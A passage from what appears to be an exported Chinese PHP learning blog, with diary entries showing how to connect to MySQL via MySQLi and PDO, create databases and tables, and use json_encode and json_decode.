<p>在PHP中实现基本与创建库一致<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 使用 sql 创建数据表</span></span></span><br><span class="line">$sql = "CREATE TABLE MyGuests (</span><br><span class="line">id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span><br><span class="line">firstname VARCHAR(30) NOT NULL,</span><br><span class="line">lastname VARCHAR(30) NOT NULL,</span><br><span class="line">email VARCHAR(50),</span><br><span class="line">reg_date TIMESTAMP</span><br><span class="line"><span class="php">)<span class="string">";</span></span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="keyword">TRUE</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Table MyGuests created successfully"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"创建数据表错误: "</span> . $conn-&gt;error;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$conn-&gt;close();</span></span><br></pre></td></tr></table></figure></p>
<p>面向过程<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$conn) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . mysqli_connect_error());</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 使用 sql 创建数据表</span></span></span><br><span class="line">$sql = "CREATE TABLE MyGuests (</span><br><span class="line">id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span><br><span class="line">firstname VARCHAR(30) NOT NULL,</span><br><span class="line">lastname VARCHAR(30) NOT NULL,</span><br><span class="line">email VARCHAR(50),</span><br><span class="line">reg_date TIMESTAMP</span><br><span class="line"><span class="php">)<span class="string">";</span></span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (mysqli_query($conn, $sql)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"数据表 MyGuests 创建成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"创建数据表错误: "</span> . mysqli_error($conn);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">mysqli_close($conn);</span></span><br></pre></td></tr></table></figure></p>
<p>PDO<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDBPDO"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="php">    $conn = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=$servername;dbname=$dbname"</span>, $username, $password);</span></span><br><span class="line"><span class="php">    <span class="comment">// 设置 PDO 错误模式，用于抛出异常</span></span></span><br><span class="line"><span class="php">    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">    <span class="comment">// 使用 sql 创建数据表</span></span></span><br><span class="line">    $sql = "CREATE TABLE MyGuests (</span><br><span class="line">    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span><br><span class="line">    firstname VARCHAR(30) NOT NULL,</span><br><span class="line">    lastname VARCHAR(30) NOT NULL,</span><br><span class="line">    email VARCHAR(50),</span><br><span class="line">    reg_date TIMESTAMP</span><br><span class="line"><span class="php">    )<span class="string">";</span></span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">    <span class="comment">// 使用 exec() ，没有结果返回 </span></span></span><br><span class="line"><span class="php">    $conn-&gt;exec($sql);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"数据表 MyGuests 创建成功"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(PDOException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $sql . <span class="string">"&lt;br&gt;"</span> . $e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$conn = <span class="keyword">null</span>;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li><p>基本上和创建数据库是一样的操作，多加上一个创建数据表的操作</p>
</li>
<li><p>在创建连接时加上一个dbname参数，来表示use选择数据库的作用</p>
</li>
</ol>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/21-基础19</title>
    <url>/2020/07/21/PHP-2020-7-21-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h1><p>Mysql使用create语句来创建或删除数据库</p>
<h2 id="使用MySQLi和PDO创建MySQL数据库"><a href="#使用MySQLi和PDO创建MySQL数据库" class="headerlink" title="使用MySQLi和PDO创建MySQL数据库"></a>使用MySQLi和PDO创建MySQL数据库</h2><p>create databases语句用于在MySQL中创建数据库</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 创建数据库</span></span></span><br><span class="line"><span class="php">$sql = <span class="string">"CREATE DATABASE myDB"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="keyword">TRUE</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"数据库创建成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Error creating database: "</span> . $conn-&gt;error;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$conn-&gt;close();</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库创建成功</span><br></pre></td></tr></table></figure><br>并且数据库中也多了一个叫myDB的数据库</p>
<p>创建数据库时必须为mysqli对象指定三个参数(servername,username,password)</p>
<p>如果想更换默认端口3306 可以写为<code>new mysqli(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;, port)</code></p>
<p>以下是面向过程创建 一样的套路<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($servername, $username, $password);</span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$conn) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . mysqli_connect_error());</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建数据库</span></span></span><br><span class="line"><span class="php">$sql = <span class="string">"CREATE DATABASE myDB"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (mysqli_query($conn, $sql)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"数据库创建成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Error creating database: "</span> . mysqli_error($conn);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">mysqli_close($conn);</span></span><br></pre></td></tr></table></figure></p>
<p>用PDO创建<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="php">    $conn = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=$servername"</span>, $username, $password);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 设置 PDO 错误模式为异常</span></span></span><br><span class="line"><span class="php">    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span></span><br><span class="line"><span class="php">    $sql = <span class="string">"CREATE DATABASE myDBPDO"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 使用 exec() ，因为没有结果返回</span></span></span><br><span class="line"><span class="php">    $conn-&gt;exec($sql);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"数据库创建成功&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(PDOException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $sql . <span class="string">"&lt;br&gt;"</span> . $e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$conn = <span class="keyword">null</span>;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li><p>使用 PDO 的最大好处是在数据库查询过程出现问题时可以使用异常类来 处理问题。如果 try{ } 代码块出现异常，脚本会停止执行并会跳到第一个 catch(){ } 代码块执行代码。 在以上捕获的代码块中我们输出了 SQL 语句并生成错误信息</p>
</li>
<li><p>面向对象创建数据库是调用对象的query()方法</p>
</li>
<li><p>面向过程创建数据库使用mysqli_query()方法</p>
</li>
<li><p>PDO可以设置错误模式为异常，并使用exec()方法来创建数据库setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION)</p>
</li>
</ol>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/20-基础18</title>
    <url>/2020/07/20/PHP-2020-7-20-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="PHP-MySQL"><a href="#PHP-MySQL" class="headerlink" title="PHP MySQL"></a>PHP MySQL</h1><p>通过PHP，可以连接和操作数据库</p>
<h2 id="PHP-MySQL-1"><a href="#PHP-MySQL-1" class="headerlink" title="PHP+MySQL"></a>PHP+MySQL</h2><p>PHP与MySQL的结合是跨平台的，可以在Windows上和Unix平台上应用</p>
<h2 id="连接MySQL"><a href="#连接MySQL" class="headerlink" title="连接MySQL"></a>连接MySQL</h2><p>PHP5以上版本建议使用以下方式连接MySQL:</p>
<ul>
<li>MySQLi extension（i 意为 improved)</li>
<li>PDO(PHP Data Objects)</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>面向对象<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"连接成功"</span>;</span></span><br></pre></td></tr></table></figure><br>面向过程<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($servername, $username, $password);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$conn) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"连接成功"</span>;</span></span><br></pre></td></tr></table></figure><br>面前PDO<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="php">    $conn = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=$servername;"</span>, $username, $password);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"连接成功"</span>; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(PDOException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h2><p>面向对象<br><figure class="highlight cos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$conn</span>-&gt;<span class="keyword">close</span>()<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>面向过程<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">mysqli<span class="constructor">_close($<span class="params">conn</span>)</span>;</span><br></pre></td></tr></table></figure></p>
<p>PDO<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$co</span>nn = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.在链接的时候出现了很多问题，大致问题是因为PHP和MySQL的版本问题，我用的是PHP7.2和MySQL8.1.5，由于MySQL版本更新了加密策略<code>caching_sha2_password</code><br>但PHP用的是<code>mysql_native_password</code>，所以需要在mysql的ini配置文件里default_authentication_plugin改为<br>mysql_native_password<br>并且使用alter user更新一次密码</p>
<p>2.PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库，如果你的项目需要在多种数据库中切换，建议使用 PDO</p>
<p>3.面向对象连接数据库，需要使用<code>new mysqli($servername, $username, $password)</code></p>
<p>4.面向过程使用<code>mysqli_connect($servername, $username, $password)</code>来连接</p>
<p>5.PDO则声明PDO的对象<br><code>new PDO(&quot;mysql:host=$servername;&quot;, $username, $password)</code></p>
<p>6.关闭连接，面向对象调用对象的close()方法；面向过程使用mysqli_close()方法；PDO则将PDO对象赋值为null</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/19-基础17</title>
    <url>/2020/07/19/PHP-2020-7-19-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><h2 id="JSON函数"><a href="#JSON函数" class="headerlink" title="JSON函数"></a>JSON函数</h2><div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>json_encode</td>
<td>对变量进行JSON编码</td>
</tr>
<tr>
<td>json_decode</td>
<td>对JSON格式的字符串进行解码，转为PHP变量</td>
</tr>
<tr>
<td>json_last_error</td>
<td>返回最后发生错误</td>
</tr>
</tbody>
</table>
</div>
<h2 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode"></a>json_encode</h2><p>PHP json_encode() 用于对变量进行 JSON 编码，该函数如果执行成功返回 JSON 数据，否则返回 FALSE </p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> json_encode ( $value [, $options = <span class="number">0</span> ] )</span><br></pre></td></tr></table></figure>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
<li>value 要编码的值，该函数只对UTF-8编码的数据有效</li>
<li>options 由以下常量组成的二进制掩码JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_NUMERIC_CHECK, JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT, JSON_PRESERVE_ZERO_FRACTION, JSON_UNESCAPED_UNICODE, JSON_PARTIAL_OUTPUT_ON_ERROR<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">   $arr = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">1</span>, <span class="string">'b'</span> =&gt; <span class="number">2</span>, <span class="string">'c'</span> =&gt; <span class="number">3</span>, <span class="string">'d'</span> =&gt; <span class="number">4</span>, <span class="string">'e'</span> =&gt; <span class="number">5</span>);</span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> json_encode($arr);</span></span><br></pre></td></tr></table></figure>
运行结果<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"a"</span>:<span class="number">1</span>,<span class="attr">"b"</span>:<span class="number">2</span>,<span class="attr">"c"</span>:<span class="number">3</span>,<span class="attr">"d"</span>:<span class="number">4</span>,<span class="attr">"e"</span>:<span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>如何将PHP对象转换为JSON格式<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">   <span class="class"><span class="keyword">class</span> <span class="title">Emp</span> </span>&#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">public</span> $name = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">       <span class="keyword">public</span> $hobbies  = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">       <span class="keyword">public</span> $birthdate = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php">   $e = <span class="keyword">new</span> Emp();</span></span><br><span class="line"><span class="php">   $e-&gt;name = <span class="string">"sachin"</span>;</span></span><br><span class="line"><span class="php">   $e-&gt;hobbies  = <span class="string">"sports"</span>;</span></span><br><span class="line"><span class="php">   $e-&gt;birthdate = date(<span class="string">'m/d/Y h:i:s a'</span>, <span class="string">"8/5/1974 12:20:03 p"</span>);</span></span><br><span class="line"><span class="php">   $e-&gt;birthdate = date(<span class="string">'m/d/Y h:i:s a'</span>, strtotime(<span class="string">"8/5/1974 12:20:03"</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> json_encode($e);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"sachin"</span>,<span class="attr">"hobbies"</span>:<span class="string">"sports"</span>,<span class="attr">"birthdate"</span>:<span class="string">"08\/05\/1974 12:20:03 pm"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>还可以使用JSON_UNESCAPED_UNICODE选项<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">   $arr = <span class="keyword">array</span>(<span class="string">'runoob'</span> =&gt; <span class="string">'菜鸟教程'</span>, <span class="string">'taobao'</span> =&gt; <span class="string">'淘宝网'</span>);</span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> json_encode($arr); <span class="comment">// 编码中文</span></span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> PHP_EOL;  <span class="comment">// 换行符</span></span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> json_encode($arr, JSON_UNESCAPED_UNICODE);  <span class="comment">// 不编码中文</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"runoob"</span>:<span class="string">"\u83dc\u9e1f\u6559\u7a0b"</span>,<span class="attr">"taobao"</span>:<span class="string">"\u6dd8\u5b9d\u7f51"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"runoob"</span>:<span class="string">"菜鸟教程"</span>,<span class="attr">"taobao"</span>:<span class="string">"淘宝网"</span>&#125;</span><br></pre></td></tr></table></figure><br>这个例子就可以看到区别了，如果不加选项的话则会将中文也转译为编码</p>
<h2 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h2><p>json_decode() 函数用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mixed</span> json_decode (<span class="variable">$json_string</span> [,<span class="variable">$assoc</span> = <span class="literal">false</span> [, <span class="variable">$depth</span> = <span class="number">512</span> [, <span class="variable">$options</span> = <span class="number">0</span> ]]])</span><br></pre></td></tr></table></figure>
<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><ul>
<li>json_string 待解码的JSON字符串，必须是UTF-8编码数据</li>
<li>assoc 当该参数为TRUE时，将返回数组，FALSE时返回对象</li>
<li>depth 整数类型的参数，它指定递归深度</li>
<li>options 二进制掩码，目前只支持JSON_BIGINT_AS_STRING</li>
</ul>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $json = '&#123;<span class="string">"a"</span>:<span class="number">1</span>,<span class="string">"b"</span>:<span class="number">2</span>,<span class="string">"c"</span>:<span class="number">3</span>,<span class="string">"d"</span>:<span class="number">4</span>,<span class="string">"e"</span>:<span class="number">5</span>&#125;';</span><br><span class="line"></span><br><span class="line">   var<span class="constructor">_dump(<span class="params">json_decode</span>($<span class="params">json</span>)</span>);</span><br><span class="line">   var<span class="constructor">_dump(<span class="params">json_decode</span>($<span class="params">json</span>, <span class="params">true</span>)</span>);</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span>(stdClass)<span class="meta">#1 (5) &#123;</span></span><br><span class="line">  [<span class="meta"><span class="meta-string">"a"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  [<span class="meta"><span class="meta-string">"b"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">  [<span class="meta"><span class="meta-string">"c"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">3</span>)</span><br><span class="line">  [<span class="meta"><span class="meta-string">"d"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">4</span>)</span><br><span class="line">  [<span class="meta"><span class="meta-string">"e"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">5</span>)</span><br><span class="line">&#125;</span><br><span class="line">array(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="meta"><span class="meta-string">"a"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  [<span class="meta"><span class="meta-string">"b"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">  [<span class="meta"><span class="meta-string">"c"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">3</span>)</span><br><span class="line">  [<span class="meta"><span class="meta-string">"d"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">4</span>)</span><br><span class="line">  [<span class="meta"><span class="meta-string">"e"</span></span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">5</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.JSON转PHP使用json_decode</p>
<p>2.PHP转JSON使用json_encode</p>
<p>3.json_decode的assoc参数为true时，就返回数组，否则就是对象</p>
<p>4.json_encode定义的类型是string；json_decode定义的类型是mixed</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/18-基础16</title>
    <url>/2020/07/18/PHP-2020-7-18-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
